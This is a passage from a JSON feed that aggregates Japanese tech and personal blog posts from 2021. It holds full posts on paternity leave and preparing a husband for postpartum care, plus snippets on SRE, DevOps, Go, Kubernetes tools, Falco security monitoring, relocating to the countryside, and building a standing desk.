育児にあてることになります。育休に入ってからスムーズに生活を切り換えられるように、妻がひっそりと「旦那教育」をしてくれていました。「ひとつのことに没頭しやすい」「家事全般はできる」といった自分の特性を理解した上で、産後のメンタルのインプットや役割の期待合わせなどができ、これは本当にやってよかったと思います。長くなるので詳しくは別記事でまとめています。pranc1ngpegasus.hatenablog.comあっという間の2ヶ月間会社は育休の期間中、会社のメールアドレスや各種アカウントなどを停止状態にして、育児に集中できる環境を整えてくれました。そのおかげもあって、育休中の2ヶ月間は家事 / 育児以外のことなんもしない人になりました。育休前の引き継ぎ完了した。育児に集中できる環境づくりをしてくれる会社に感謝だし、育休取得の背中を押してくれたkonifarさんはマジで上司でよかったと思える存在。いってきます！— てんま (@pranc1ngpegasus) June 15, 2021  twitter.com家事の中で特に気を遣ったのは食事です。たんぱく質や鉄分、葉酸、カルシウム、各種ビタミンなどが足りなくなるようで、ほうれん草やひじき、季節野菜、焼き魚などを多めに取り入れたごはんをつくっていました。朝ごはん pic.twitter.com/P5uTSwLUXO— てんま (@pranc1ngpegasus) June 19, 2021  twitter.comまた我が家にはわんこがいます。僕らの愛情を独り占めしていたわんこからすると、娘は僕らを取ってしまう急にきたよそ者です。入院中から娘のガーゼの匂いを嗅がせて慣れさせたり、退院後は娘が泣いてもわんこを撫でてから抱っこしたり工夫をしていました。いまは娘がぐずったら教えてくれるお兄ちゃん犬にレベルアップしました。ﾑｽﾒとﾜﾝｺ#LeicaSL2 #SIGMA2470F28Art pic.twitter.com/2AMauOZOlT— てんま (@pranc1ngpegasus) June 19, 2021  twitter.com夫婦がお互いに月に一回、半日ずつプライベートな時間を確保できるように工夫しながらあっという間に2ヶ月が終わっていきました。ちなみに妻はNEWSの増田くんが好きで、よくライブDVDを見て気分転換をしていました。今日は少しだけ羽根を伸ばす時間をいただいて洗車へ。運転席もRECAROなのでベビーシートもRECAROです pic.twitter.com/0gFF2v2D7t— てんま (@pranc1ngpegasus) July 17, 2021  twitter.comはじめての育児はなかなか一筋縄ではいかないもので、夫婦で役割分担を試行錯誤しました。夜間の3回の授乳は基本的に妻が対応をしていました。僕も最初の頃は初回を担当していましたが一度寝たら中々起きられず、妻に起こしてもらっていました。でも翌日、眠気が強く家事に影響が出たので断念。妻も寝不足でつらそうだったので育休中に2~3回ほど夜間のミルクを全て担当しましたが娘が泣いていてもいびきをかいて寝ていて、ぬいぐるみを投げつけられたことも。そして翌日は案の定使い物にならず。夜間授乳をしている全国のお母さんたちに脱帽です。結局我が家では睡魔と闘う妻を横目に僕は寝て、翌午前中に妻が仮眠を取るという分担に落ち着きました。育休は終われど育児に終わりなし現在は仕事に復帰して、生活リズムも整ってきました。育休中も寝かしつけ後の1~2時間はコードを書いてたので復帰も意外とすんなり出来ました。育休が終わったからといって育児参加も終わりではなく、朝ごはんは僕の担当ですし午前中の妻の仮眠時間中は抱っこひもをしながら仕事をしています。また沐浴、寝かしつけも妻と分担してやっています。会社が育児に理解があるので、妻だけに任せることなく平日も過ごせています。会社にがんばってほしかったところ実は特に見つかりませんでした。会社からはほしいだけとっていいよと言われていましたが、僕と妻は2ヶ月間を選択しました。2ヶ月の育休は短いと思われるかもしれませんが我が家にとっては短くも長くもなく、妻の体調も回復して元の生活に戻るちょうどいい期間だったと思います。会社としても僕としてもはじめての育休取得だったことから、育休前から何度もMTGの時間をもらって確認事項の突き合わせをしたし、書類のやりとりも多かったように思います。これは慣れが必要なことだと思うのでしかたないと思います。今後さらに運用がブラッシュアップされていくものと思いますが、その先陣を切る形で自分が育休の事例を作れたことはよかったんじゃないかと感じています。まとめまもなく生後3ヶ月になる娘は体重が出生体重の2倍近くになりつつあり、日々成長を感じます。生後1ヶ月半を過ぎた頃が妻は一番つらかったらしく、一緒に育児をしてくれてすごく助かったと言ってくれて改めて育休を取得してよかったと感じました。これからも家族3人と1匹で楽しく過ごしていこうと思います。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2021/08/31/100000?utm_source=feed","isoDate":"2021-08-31T01:00:00.000Z","dateMiliSeconds":1630371600000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"妻が助かる旦那の立ち回りについて","contentSnippet":"6月に第一子となる娘が爆誕し、育児休業を取得した。育児休業を取得した背景に昨今の家庭事情である核家族化があった。どちらの両親にも頼れず、初めての育児に挑むのは丸腰の状態でボス戦に挑むようなもの。でもリトライできないのが育児。ましてや相棒である旦那が育児に参加しないとなると丸腰+ステータス異常によりHPが半分以下の状態で戦闘開始するぐらい妻への負担大である。そりゃあそんな相棒は必要ない!って言いたくなる。けしからんですよ。僕だってそんな状況ならパーティー再編集したくなってリセットボタンを押したくなる。我が家では産後に起こりがちな家庭崩壊の危機を回避するべく妻がしれっと「旦那教育」をしてくれていた。産後どのような行動をしてほしいか、どのような心構えでいてほしいか、など妻が考える「旦那にやってほしいこと」を旦那である僕に叩きこんだ「旦那教育」について一部をまとめる。旦那教育のゴール育休中に妻が育児と産後の体力回復にフルコミットできる環境作り育休前に妻がやっていた家事全般育児のサポート役にもまわる旦那の特性ひとつのことに没頭しやすい家事が並行して消化できると自分の時間が取れるようになる集中しだすと時間を忘れてしまうタイムスケジューリングを意識づけさせる習得までに回数が必要n回教えても習得できないたまにモノの場所があいまい言葉よりも動いて覚えさせるもともと家事全般ができる野菜の切り方ひとつから教える必要はないアドバイスを率直に受け入れる意識して教えたこと妻が監視しつつ効率化のアドバイス空き時間を見つけては家事全般をやらせる掃除の仕方も全て妻がやっていたことと同じように教える旦那が徐々に覚えてきたことに対して毎回フィードバック育休中に非効率にならないために短期間で教育よかった点 / もうすこしな点 / 改善策など買ってきたものの片付けを意識的に旦那にやらせてモノの位置を覚えさせる冷蔵庫の中の在庫状況を意識させる産後の身体の状態について教える育児本をいっしょに読む産褥期の回復の大切さ、無理した場合に起こることを知る「全治2ヶ月の交通事故にあった」状態を理解するわからないことは妻に聞かずに自分で調べるよう習慣化させる産後のメンタルの状態について教える産後はイライラしやすい普段とは比べものにならないくらい沸点が低い怒りたくて怒っているわけではないことを理解してもらう「わかった」「わかってる」言い方ひとつ間違えるだけでイライラしてしまうまとめ旦那教育を受けてみて、僕がいつも仕事をしている間に妻はこんなに仕事をしていたんだとわかった。だからMTGの合間の時間ちょうどに昼食を食べれるし、きれいな布団で寝れる。生ゴミは臭くないし、Tシャツも生乾き臭くない。これで給料なし?と思うほどの仕事量だし、まわりにたくさん気をつかう。こんな求人広告があっても僕は絶対にやりたくない。でもこれを全国のお母さんがやっていると思うと尊敬の意である。出産後、妻が退院して実際に育休に入ってから旦那教育の成果を100%出せたかというとそうではない。7~8割というところだろう。どうしても仕事があり妻に頼りがちになっていたところがあったのだと思う。座学だけでは実践がうまくいかないのと似ている。とはいえ基本ができていたことで初日からまあまあうまく立ち回れたし、妻も「うまくできていたよ」と評価してくれている。ご家庭によって奥さんがしてほしいことは異なるかもしれないが、余裕がある旦那さんは参考にしてみてはいかがだろうか。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2021/08/28/000000?utm_source=feed","isoDate":"2021-08-27T15:00:00.000Z","dateMiliSeconds":1630076400000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"SREとDevOpsの違いはなにか","contentSnippet":"SREとDevOpsの違い DevOpsとは SREとは DevOpsの実装としてのSRE 継続的な改善の必要性 組織を超えたコラボレーション 変更管理と自動化 計測の重要性 非難のない文化 開発速度の改善 SREのこと […]The post SREとDevOpsの違いはなにか first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-vs-devops/","isoDate":"2021-08-25T15:24:14.000Z","dateMiliSeconds":1629905054000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREとインフラエンジニアの違いを3つのポイントで理解する","contentSnippet":"SREとインフラエンジニアの3つの違い 1.業務範囲 2.スキルセット 3.方法論 インフラエンジニアのキャリアパスとしてのSRE 希少なSRE人材が提供する高品質なSREサービス = Sreake ここ数年、国内外問わ […]The post SREとインフラエンジニアの違いを3つのポイントで理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-vs-infrastructure-engineer/","isoDate":"2021-08-25T09:00:00.000Z","dateMiliSeconds":1629882000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREサービス「Sreake」についての解説","contentSnippet":"一般的なSREの定義について SREを導入するのが難しい理由 SLIの計測を行うための環境構築 SLOの適正設定の難しさ トイルの判別と自動化 人材面での難しさも Sreake = SREスペシャリストチームとともに、貴 […]The post SREサービス「Sreake」についての解説 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre-service-sreake/","isoDate":"2021-08-23T06:45:04.000Z","dateMiliSeconds":1629701104000,"authorName":"Sreake","authorId":"Sreake"},{"title":"FirebaseのCliでの操作で401系エラーが出るときの解決法","contentSnippet":"考えられる原因は以下ですログインできていない本当に権限がないcliに保存されているクレデンシャルが古い 前提環境としてはfirebase-tools 9.16.5です ログインできていないコレはわかりやすいです。以下コマンドでログインしてくださいfirebase loginちなみに、すでにログインしている場合は、ログインしているアカウントが表示されます(コレはまりポイント 本当に権限がないGCPのIAMの権限を確認してください。個人で直接Firebaseプロジェクトを作っている場合はあまり関係がないかもしれません。 cliに保存されているクレデンシャ...","link":"https://zenn.dev/satohjohn/articles/d409819196c6b8","isoDate":"2021-08-17T05:54:30.000Z","dateMiliSeconds":1629179670000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"『SREの車窓から』という題で #geekgig に登壇。 ","contentSnippet":"前書き『GeekGig #1 〜Goと私の一年〜』という株式会社Showcase Gigが主催しているイベントでLTで登壇してきました。運営の皆様ありがとうございました。今回の登壇はSREというよりもシステム管理者がGo言語を使うメリットについて言及しました。タイトルはミスリードです。申し訳ございません。しかし、SREやシスアドの仕事は本当に楽しいことばかりではないですが如何に楽しくやっていくかを考えるのは楽しいなと思っています。showcase-gig.connpass.comまた、Modern System Administrationでは特定の言語に縛られてはないのですがシステム管理者がプログラミング言語を習得することについてのいくつかの言及があったので読んでみてください。learning.oreilly.comSREやインフラエンジニアではないのですが個人的には小野 和俊さんの書籍である「その仕事、全部やめてみよう」で言及されている【ラストマン戦略】が好きで、コードが読めたり書けたりするインフラマンというのは重宝されるように思えます。今回の発表はその啓蒙の一つだと思います。www.bookbang.jpインフラとGo言語が混ざったFukuoka.go という最高の勉強会があって直近のものに関しては動画も公開されているのでみておくのも良いかと思います。fukuokago.connpass.comまた、勉強会やコミュニティーに対して定期的に参加することは技術的なモチベーションにも繋がるので発表者になるのも良いかと思います。nulab.com登壇資料の文字起こしと補足各分野や文字に対して響いた時に読んでほしい本がいくつかあるので記載しておきます。 speakerdeck.comQ.今年は私がGo言語で何をしていたか？A.ほぼ全てで Go言語を利用している生業としてはインフラやプラットフォームの構築や開発をしたり、インフラでの便利ツールの作成をやってました。一昨年ぐらいから規模感でPythonやシェルスクリプトを選択するという場面が減りました。私は作業シェルにfishを利用しているのですがこれらの環境に直接影響があるものや自分でライブラリーの開発が必要でそれらが面白くなさそうな場合以外は全てGo言語で実装するようになりました。最近では、個人開発の生産性の観点からも慣れのおかげでGo言語一択になっています。自動化楽したいあわよくば全ての作業は自動化されてほしい。しかし、開発スキルなしでは正確に自動化できず、運用スキルなしでは正しく自動化できません。昨今の運用が抱える自動化はソフトウェアチームの核心である継続的なデプロイや義務である継続的デリバリーだけではありません。しかも、この分野に全ての問題を一挙に解決してくれるカリスマ的なツールは存在せず。いくつかのツールを合わせて利用することになり、Go言語はさまざまなツールに対応しております(ちなみに、シェルスクリプトの知識は大事)。自作可能。クラウドネイティブな世界ではプログラマブルに制御できる範囲がGo言語だと広い関連書籍learning.oreilly.comlearning.oreilly.comlearning.oreilly.comlearning.oreilly.comコラボレーション開発者には運用スキルが必要です。彼らの責任はコードを書くことだけではなく、システムを本番環境にデプロイしてアラートを監視することです。同様に運用者にも開発のスキルが必要です。本番アラートを監視することだけではなく、不具合が起こった時の事象の認識、コードの特定、変更などできれば良い関係になるんではないでしょうか？もし、開発チームと運用チームが同じプログラミング言語で開発していたら素晴らしいと思いませんか(まぁどんな言語でもいいけど)？。それこそ、書籍でしか文字として認識しかしてない開発チームと運用チーム間の双方向のコラボレーションが発揮させれるのではないでしょうか？開発と運用が協力してツールや知識は開発と運用の間のすべてを双方向に生かされて成功は約束された感じがしてきませんか？最近だと、Node.jsやDartなどもっと複数のレイヤーを跨いで協業できる言語も増えています。各チームや組織ごとに最適なものをその場、その場で決めていけば良いと思います。10x.co.jp関連書籍learning.oreilly.comlearning.oreilly.com解像度Goで開発された世界の素晴らしいツールやミドルウェアの実装が読めると自分のチームの開発や運用の役に立つことや自分自身の実力になることも多く良い循環がまわるようになる。現在、SREやインフラエンジニアが使う多くのツールやミドルウェアがGo言語で開発されている。そのため、Go言語特有のエラーやログのメッセージに慣れておくことによって今まで、不思議で意味のなかった文字列が開発者からのメッセージに見えてくるようになって、デバッグ時や問題発生時に非常に役に立ちました。ツールやミドルウェアを使っている時の解像度がグッと上がった気がします。関連書籍learning.oreilly.comlearning.oreilly.com最後にこの発表はハッカー的な意味合いというより自戒や啓蒙などを込めたものでした。年に何回かエモいだけの発表がしたくなるのですが相応に数人が楽しく仕事できればもはやなんでも良いのではないかと思いだしました。次回があればもっと技術に寄った発表をします。でも、転職して3ヶ月で思ったことは本当にhttps://dart.dev/","link":"https://syu-m-5151.hatenablog.com/entry/2021/08/17/114732","isoDate":"2021-08-17T02:47:32.000Z","dateMiliSeconds":1629168452000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"App Modernization OnAiar 登壇","contentSnippet":"Sreake 事業部の手塚です。先日、Google Cloud 様が開催されている App Modernization OnAir に登壇いたしましたので、その日記になります。 App Modernization OnA […]The post App Modernization OnAiar 登壇 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/app-modernization-onaiar/","isoDate":"2021-07-20T02:56:50.000Z","dateMiliSeconds":1626749810000,"authorName":"Sreake","authorId":"Sreake"},{"title":"謎のベールに包まれたGoogleの次世代SIEM「Chronicle」を触ってみた","contentSnippet":"こんにちは、堤＠スリーシェイクです。 本日は、現時点（2021年6月17日）では英語でも日本語でもそれほど情報がないGoogleが開発したSIEM（Security Information and Event Manag […]The post 謎のベールに包まれたGoogleの次世代SIEM「Chronicle」を触ってみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/about-google-chronicle/","isoDate":"2021-06-18T09:00:32.000Z","dateMiliSeconds":1624006832000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Open Telemetry + Google Cloud Trace やってみた","contentSnippet":"モチベーションGoogle Cloud Trace(以下Cloud Trace)がOpen Telemetryの対応をしているということで、更にドキュメントにはないけど(2021-06-14現在)Javaでもライブラリができたので、それを試してみる。分散トレーシングしたいって言う場合、GKEで組んでいる場合、Cloud Traceのライブラリを使って直接送るっていうのもありだが、Open Telemetryを使うことで、他のツールにも送れるような仕組みができる。 前提分散トレーシングについて知っているNuxt.jsについて少し知っている Open Telemetr...","link":"https://zenn.dev/satohjohn/articles/e37e8575966204","isoDate":"2021-06-14T05:35:09.000Z","dateMiliSeconds":1623648909000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"denops.vimを使って引用符と括弧を操作するVimのプラグインを書いた","contentSnippet":"はじめにかねてから、Denoを触ってみたいけど肝心の作るものがないなと思っていました。そんな矢先にたまたまdenops.vimとの邂逅を果たしたので、昔作ったプラグインを書き直してみました。denops.vimについてはhttps://github.com/vim-denops/denops.vimhttps://zenn.dev/lambdalisue/articles/b4a31fba0b1ce95104c9 作ったものhttps://github.com/atsuya0/dps-surrounding.vim題目のとおり、引用符と括弧を操作するvimのプラグイ...","link":"https://zenn.dev/tayusa/articles/58d1c20172f662","isoDate":"2021-06-13T15:41:53.000Z","dateMiliSeconds":1623598913000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Kustomize でスラッシュを含むパスにパッチを当てる","contentSnippet":"背景Kustomize では JSON Patch を用いて base のマニフェストにパッチを当てることができます。例えば，以下のマニフェストdeployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    app.kubernetes.io/name: myapp    app.kubernetes.io/version: v1.0.0    name: myapp    version: v1.0.0...の version の値を v1.0.1 に変えたい場合は，以下の...","link":"https://zenn.dev/toshikish/articles/38896bb9ae1913","isoDate":"2021-05-31T07:34:24.000Z","dateMiliSeconds":1622446464000,"authorName":"toshikish","authorId":"toshikish"},{"title":"東京から地方に引っ越して1年くらい経った話","contentSnippet":"こんな状況になってからわりとすぐに、実は東京から地方に引っ越してました。筆者のこれまでド田舎生まれド田舎育ち、就職してから大阪、名古屋、東京と転職をしながら移住していました。2020年2月に結婚後、2020年7月から地方在住。これまでの暮らし居住エリア東京にてエンジニアとしてオフィスに通勤しながら働いていました。はじめは中央線沿線で一人暮らしをしていたのですが、転職や結婚を機に引っ越して東横線沿線で暮らしていました。東横線が毎日混んでいてつらかった思い出があります。暮らし嫁氏と僕は基本的にインドアでしたが、たまに気が向くとディズニー散歩(アトラクションに乗らず飲み歩き)をしにいったり、アフタヌーンティーを楽しんだりしていました。どうして地方移住したのか2020年3月頃から会社がリモートワーク体制に入り、緊急事態宣言下の東京に住んでいる意味を感じなくなったこと、夫婦揃って田舎出身だったため子供は田舎で育てたいという気持ちが強かったことで地方移住を決めました。地方移住をするにあたって考えたことクルマ自転車だけで移動するには限界があるし、地方ではどこへ行くにも車が基本です。もともと車が好きだったので、嫁氏と相談しつつ最終的には自分の好きな車を妥協せず買いました。2020年冬には妻用の車も購入し、現在は2台所有しています。おうち引っ越し先は嫁氏の地元で、土地勘があったのである程度エリアを絞ってもらい、犬をお迎えしたかったのでペット可物件を探しました。東京なら駅チカがいいとか、どの路線がいいとか考えますが、地方の場合は車があるので土地の治安がよいか、スーパーが近くにあるかなどを考えました。地方移住して変わったこと地方は家賃が安いから生活費にお金をかけられる!! と思われがちなのですが、車の維持費やランニングコストのことを考えると同程度なのかなと思います。時間という束縛から開放された一番変わったと感じることは時間に縛られなくなったことです。東京に住んでいるときは「何分発の電車に乗らなきゃ」とか「何時までに行かないと間に合わない」みたいな感覚がなくなって心に余裕ができました。とはいえ「間に合わないから車を飛ばす」という感覚に変化したので実は変わっていないのかもしれません。家族の時間が増えたもうひとつ個人的な変化ではありますが、嫁氏が専業主婦になったことで家族の時間が増えました。僕は平日勤務、嫁氏は水日休みのシフト制だったので二人が一緒に過ごせる休日は日曜日しかありませんでした。ただでさえリモートワークで一日中おうちにいるので余計にそう思うのかもしれません。まとめ地方移住したけど生活水準は全く下がらず、むしろ快適に暮らしています。これからは子供のことを考えたり、家を建てたりすることを視野に入れつつ田舎暮らしを満喫したいと考えています。","link":"https://pranc1ngpegasus.hatenablog.com/entry/2021/05/16/175100?utm_source=feed","isoDate":"2021-05-16T08:51:00.000Z","dateMiliSeconds":1621155060000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Rustの練習","contentSnippet":"概要完全に参照の部分に慣れていないので、これをどうやって対応したのかを自分の整理のためにもメモしていくexerismでRustの勉強をしているが、その問題を使う Simple Linked List全容： https://exercism.io/tracks/rust/exercises/simple-linked-list/solutions/d0fdfb1c904344ecbf4bcf808c345cdc以下のような構造ときので後入れ先出しのパターンの場合pub struct SimpleLinkedList<T> {    head: Option&...","link":"https://zenn.dev/satohjohn/articles/536589f3a86600","isoDate":"2021-05-01T14:15:59.000Z","dateMiliSeconds":1619878559000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"First-Party Setsについて","contentSnippet":"概要Cookie のセキュリティについてです。 partyCookieにはfirst-partyとthird-partyがあります。first-partyとは現在訪れているドメインです。third-partyとは現在訪れているドメインとは違うドメインです。 SameSite Cookieshttps://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite現在、訪れているドメインから別ドメインにHTTPリクエストを送信するときに、Cookieをセットするか設定するものです。これには...","link":"https://zenn.dev/tayusa/articles/efa8aa75ad5519","isoDate":"2021-04-25T16:30:34.000Z","dateMiliSeconds":1619368234000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"ユーザーのGoogle Calendarへ予定を自動登録","contentSnippet":"概要Webサービスで映画や美容室の予約を行うと、たまに自分のGoogle Calendarに自動で予定が追加されていることがあると思います。それはGoogleが提供しているEmail Markupという機能によるものです。 Email Markupとはhttps://developers.google.com/gmail/markupEmail Markupは schema.org を使って新たなにEmailの機能を追加できる仕組みです。Emailの文面のHTMLに schema.org マークアップというデータを加えることで動作します。schedma.org マーク...","link":"https://zenn.dev/tayusa/articles/bacac8cbf8ff16","isoDate":"2021-04-25T16:24:54.000Z","dateMiliSeconds":1619367894000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Kyashに入社して2年くらい経った話","contentSnippet":"在職エントリです。やっていたことKyash DirectKyash DirectはKyashがウォレットアプリで培ってきたプリペイドカードの発行・Visaネットワークでの決済などの技術を決済プラットフォームとしてB to Bの世界にも提供するために生まれた新規プロダクトです。その立ち上げから事業譲渡が完了するまでのほぼ全ての期間で携わりました。実はKyashに入社するまで業務ではほとんどGo言語を触った経験がなかったので、開発スピードが要求される新規プロダクトのチームに配属されて間もない時期は「コードが全く書けない新入社員」をやっていました。初めてProduction環境にリリースをするまで半年間、一時は開発を離れてQA担当やKyash Direct導入企業様のテクニカルサポートを行いながらチームみんなで協力して本番リリースまで持っていけたのは貴重ないい思い出です。WalletアプリKyashKyash Direct事業譲渡の発表があってすぐにWalletアプリ側の開発チームに配属されました。Kyashマネー残高を銀行に出金するプロジェクトにはじまり、マイナポイント、eKYCなどの開発に携わりました。開発スピードを保ちながら技術的負債をなんとか攻略して開発を進めるのはつらいと思うことがありますが、楽しいと思うことがほとんどです。これからもKyashが目指すプロダクトを実現すべく開発を進めていきます。チームの現状と課題チームなんでも屋現在所属しているチームはCustomer Engagementチームといいます。チーム名からはなかなか業務内容が想像しにくいかと思いますが、簡単に言うとKyashアプリの中で「入金」と「決済」以外の部分のほとんどを担当するチームです。Kyashアプリの中で入金と決済以外の部分ってほとんどないとか言われてしまいそうですが、これまで銀行への出金機能、マイナポイント、eKYC機能の開発に携わりました。アプリを通じた接点という意味でユーザと関係性の深い部分の開発を一手に担っていて、なんでも屋と言えるかもしれません。技術的負債との戦いKyashではマイクロサービスアーキテクチャを採用していて、チームごとにいくつかのサービスを担当しているのですが、Customer Engagementチームが担当する中に「api」と名のついたサービスがあります。このサービスはKyashアプリの中ではおそらく一番古くて、巨大で、複雑なサービスです。きっと、モバイルアプリからの通信を各マイクロサービスに割り振って、返ってきた情報を整形して返すのが理想的な形でしょう。現状はGET系リクエストに対してDBから情報を取ってくる部分から行っていたり、送金などPOST系リクエストに対して残高変動を伴う処理を行っていたり、かなり多くのドメイン知識を持ってしまっています。プロダクトの新規開発スピードを保ったままサービスやライブラリとして切り出すなどの改善をするのはかなり難しく、ほとんどできていません。たまには全力疾走してきた道を振り返る時間が必要ですね。これからの半年実は、6月頃に家族が増えます。初めてなので生活リズムや習慣が大きく変化すると思われます。ちょうどこの4月に出産休暇という休暇制度ができたり、1~2ヶ月間の育児休業を取得したい話を進めていたりして、会社やチームが柔軟に対応してくれて助かっています。育児休業が終わって仕事に戻っても、フルリモートワークで普段から自宅に籠っているので可能な限り夫婦で分担をしながら育てていきたいと考えています。Kyashのプロダクトにはいろいろな意見があるとは思いますが、Kyashが目指すところに向かってこれからもがんばります。Kyash ID: pranc1ngpegasus","link":"https://pranc1ngpegasus.hatenablog.com/entry/2021/04/15/143900?utm_source=feed","isoDate":"2021-04-15T05:39:00.000Z","dateMiliSeconds":1618465140000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"Google 認証でクライアント証明書発行のセルフサービス化","contentSnippet":"以前、 caddy について調べてて発見した smallstep でクライアント証明書発行を便利にできないかなということで調査です。( Hashicorp Vault でもできるっぽいけど用途的にわざわざクラスタ組むの面倒","link":"https://blog.1q77.com/2021/04/step-ca-with-google-oidc/","isoDate":"2021-04-10T14:44:13.000Z","dateMiliSeconds":1618065853000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Kubernetes上に展開したFalcoで、ホストOS側のファイル整合性監視を行う","contentSnippet":"スリーシェイク大阪オフィスのSREの堤です。今回もFalcoネタです。 Falcoは、Kubernetesのコンテナ環境における振る舞い検知型のセキュリティツール。今回はFalcoにおける「ファイル整合性監視（File  […]The post Kubernetes上に展開したFalcoで、ホストOS側のファイル整合性監視を行う first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/kubernetes-falco/","isoDate":"2021-04-07T05:49:43.000Z","dateMiliSeconds":1617774583000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Falco + Falcosidekick + Kubelessを使って、Falcoのイベントトリガーで任意のサーバレスコードを実行してみた","contentSnippet":"スリーシェイクのSREの堤です。 Falcoってご存知でしょうか？Falcoはオープンソースのセキュリティランタイムで、もともとはSysdig社が開発して、現在はそのオープンソース版としてCNCF傘下で管理されています。 […]The post Falco + Falcosidekick + Kubelessを使って、Falcoのイベントトリガーで任意のサーバレスコードを実行してみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/falco-falcosidekick-kubeless/","isoDate":"2021-03-25T05:08:00.000Z","dateMiliSeconds":1616648880000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SREとシステム運用","contentSnippet":"スリーシェイクのSREの堤です。 本日は、「SREとシステム運用」に関して、15年以上のエンジニアで培ってきた経験を元に、私自身のシステム運用に関する考えを述べていきたいと思う。 ※この記事は、株式会社スリーシェイクとし […]The post SREとシステム運用 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/sre%e3%81%a8%e3%82%b7%e3%82%b9%e3%83%86%e3%83%a0%e9%81%8b%e7%94%a8/","isoDate":"2021-03-20T05:39:00.000Z","dateMiliSeconds":1616218740000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ひろびろ一枚板でつくるすっきりデスク","contentSnippet":"これはなにみなさま、「デスクをすっきりさせるマガジン」はご存知でしょうか。note.comこれまでのデスクこの状況下になり社のリモートワークが始まってから家族とともに地方へ引っ越したため、これまでのデスクは折りたたみテーブルにディスプレイを載せただけのデスクでした。飲みものを置くと作業スペースが手狭になるくらいの大きさです。今回のデスクに必要な要件リモートで働くうえで必要になるデスクってどんなだろう? 高級チェアは必要? スタンディングデスクは? など多様な選び方があるデスク業界(ない業界)ですので、主軸がブレないように今回の要件を定義しました。内容は以下の通りです。デザイン性が高い立ったり座ったり、姿勢を変えながら作業ができるひろびろ作業がしたいのでなるべく広くデザイン性は、まあせっかく作るならかっこいいデスクがつくりたい! という気持ちがあるので第一に挙げました。またリモートで夜遅くまで働いていたり、地方在住という特性上、運動不足になる可能性が非常に高いことから立ったり座ったりできることを挙げました。さらに、いままでのデスクが非常に手狭だったことと、過去に室内ドアをはずしたものをそのままデスクの天板として使ったら予想以上に使い勝手がよかったことから、なるべく広いスペースのデスクにしたいことを挙げました。デスク脚デスク脚は以下の点を考慮して商品選びをしました。自分に合った高さに調整ができる天板を広くしたいのでその重量を支えられる上記のような仕様を叶えられるデスク脚はかなり少なく、価格のことも考えて今回はFlexispot E3シリーズを選びました。FLEXISPOT スタンディングデスク 電動式 昇降デスク 高さ調節デスク 人間工学 メモリー機能付き オフィスワークテーブル パソコンデスク ゲーミングデスク 学習机 勉強机 ブラック EQ6（天板別売り）FLEXISPOTAmazonデスク天板デスク天板は以下の点を考慮して商品選びをしました。やっぱ憧れの一枚板でしょFlexispotが支えられるのは幅2000mm x 奥行800mmで100kgまで本来は現地で木と向き合いながら好みの天板を見つけるべきかと思っていましたが、ご時世がご時世だったので通販で購入できる天板を探しました。akita-zaimokuya.com天板の加工天板は一枚板ということもあり、一生使えるものに仕上げたいという思いから近くの木材加工店に研磨と塗装をお願いしました。でけぇ pic.twitter.com/g9KLMXPhzf— てんま (@pranc1ngpegasus) 2021年2月6日  twitter.comいよいよ天板が届き車で運送業者の営業所まで受け取りにいったのですが、助手席を前方にめいっぱい移動させたり、一人で運べる重さではなかったので運送業者の方に載せるのを手伝ってもらったりしながらなんとか荷台に押しこめました。はい pic.twitter.com/0CSWeGbMmM— てんま (@pranc1ngpegasus) 2021年2月20日  twitter.com木材加工店から完成の連絡があり家まで運び込みました、すばらしい木目!! このあと二階にある自室まで妻に手伝ってもらいながら運び込み、翌日から執筆中の本日もひどい筋肉痛に襲われています。罫書くぞー pic.twitter.com/47ZZzUoiob— てんま (@pranc1ngpegasus) 2021年2月20日  twitter.comいよいよケガキ作業に入ります。FlexiSpotは脚の幅を調整することができるためか正確な寸法を計測することができませんでした。そのため現物合わせでケガキを行いました。作業開始！ pic.twitter.com/0Gb5OK4jVt— てんま (@pranc1ngpegasus) 2021年2月21日  twitter.com翌日、近くのホームセンターからインパクトドライバをレンタルしてきて、ケガキをした場所に鬼目ナットを埋め込みました。かんぺきいぃぃぃぃ！！！！ pic.twitter.com/S2v9HXGfty— てんま (@pranc1ngpegasus) 2021年2月21日  twitter.comFlexiSpot付属の木ネジ寸法と、一枚板を固定するのに十分な固定力の兼ね合いから、今回はFlexiSpotモータ部の固定にM6x20mmの鬼目ナット、デスク中央部分の固定にM4x15mmの鬼目ナットを埋め込みました。ボルトは締めつけ強度の強い、六角穴つきボルトのM6x20mm、M4x15mmを選びました。で、できたぞー！(配線はあとから隠す) pic.twitter.com/kYzLgvTRV6— てんま (@pranc1ngpegasus) 2021年2月21日  twitter.com鬼目ナットさえ埋め込めば、あとはFlexiSpot脚の上に天板を載せて、下からビスで固定するだけです! ついに完成\uD83C\uDF89\uD83C\uDF89まとめカメラコーナーが爆誕した 